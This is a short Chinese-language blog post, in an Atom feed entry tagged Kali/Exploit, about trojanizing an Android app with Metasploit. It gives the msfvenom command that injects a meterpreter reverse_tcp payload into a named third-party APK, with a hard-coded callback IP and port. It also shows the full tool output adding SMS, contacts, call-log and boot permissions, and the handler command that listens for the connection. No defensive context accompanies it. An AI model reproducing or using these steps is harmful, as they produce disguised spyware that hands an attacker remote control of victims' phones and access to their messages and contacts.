    <id>https://askding.github.io/Kali/Exploit/%E5%88%A9%E7%94%A8msf%E6%A1%86%E6%9E%B6%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E8%BF%9B%E8%A1%8C%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C.html</id>
    <published>2022-03-14T11:11:40.000Z</published>
    <updated>2022-03-14T11:11:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>aptkool</p><p>利用msf框架对安卓手机进行简单操作 </p><p>渗透安卓</p><ol><li>环境准备<pre><code>  1.  `brew install --cask android-sdk  &amp;&amp; brew install apktool`    2.   `sdkmanager &quot;platform-tools&quot; &quot;build-tools;28.0.3&quot; &quot;platforms;android-28&quot; `  安装zipalign  3.   `export PATH=$PATH:/usr/local/Caskroom/android-sdk/4333796/build-tools/28.0.3`   配置zipalign  4.   </code></pre></li><li>制作APK<pre><code class="zsh">msfvenom --platform android       -x Desktop/jihu.jihuapp_2.7.12_20712.apk       -p android/meterpreter/reverse_tcp       lhost=101.132.34.104 lport=19003       -o Desktop/jihu_evil.apk</code></pre></li></ol><p>Using APK template: Desktop/jihu.jihuapp_2.7.12_20712.apk<br>[-] No arch selected, selecting arch: dalvik from the payload<br>[<em>] Creating signing key and keystore..<br>[</em>] Decompiling original APK..<br>[<em>] Decompiling payload APK..<br>[</em>] Locating hook point..<br>[<em>] Adding payload as package jihu.jihuapp.glfku<br>[</em>] Loading /var/folders/v6/g93y9wqj229_s53gx3yp67q00000gn/T/d20210816-2205-4bcwjl/original/smali_classes4/jihu/jihuapp/MainActivity.smali and injecting payload..<br>[<em>] Poisoning the manifest with meterpreter permissions..<br>[</em>] Adding <uses-permission android:name="android.permission.WRITE_SETTINGS"/><br>[<em>] Adding <uses-permission android:name="android.permission.RECEIVE_SMS"/><br>[</em>] Adding <uses-permission android:name="android.permission.WRITE_CONTACTS"/><br>[<em>] Adding <uses-permission android:name="android.permission.SEND_SMS"/><br>[</em>] Adding <uses-permission android:name="android.permission.READ_CALL_LOG"/><br>[<em>] Adding <uses-permission android:name="android.permission.CALL_PHONE"/><br>[</em>] Adding <uses-permission android:name="android.permission.WRITE_CALL_LOG"/><br>[<em>] Adding <uses-permission android:name="android.permission.READ_CONTACTS"/><br>[</em>] Adding <uses-permission android:name="android.permission.READ_SMS"/><br>[<em>] Adding <uses-permission android:name="android.permission.SET_WALLPAPER"/><br>[</em>] Adding <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/><br>[<em>] Adding <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/><br>[</em>] Rebuilding apk with meterpreter injection as /var/folders/v6/g93y9wqj229_s53gx3yp67q00000gn/T/d20210816-2205-4bcwjl/output.apk<br>[<em>] Signing /var/folders/v6/g93y9wqj229_s53gx3yp67q00000gn/T/d20210816-2205-4bcwjl/output.apk<br>[</em>] Aligning /var/folders/v6/g93y9wqj229_s53gx3yp67q00000gn/T/d20210816-2205-4bcwjl/output.apk<br>Payload size: 23173289 bytes<br>Saved as: Desktop/jihu_evil.apk</p><pre><code>3 监听```zshhandler -H 101.132.34.104 -P 19003 -p android/meterpreter/reverse_tcp</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;aptkool&lt;/p&gt;
&lt;p&gt;利用msf框架对安卓手机进行简单操作 &lt;/p&gt;
&lt;p&gt;渗透安卓&lt;/p&gt;
&lt;ol&gt;
&lt;</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="Exploit" scheme="https://askding.github.io/categories/Kali/Exploit/"/>
    
    
  </entry>
  
</feed>
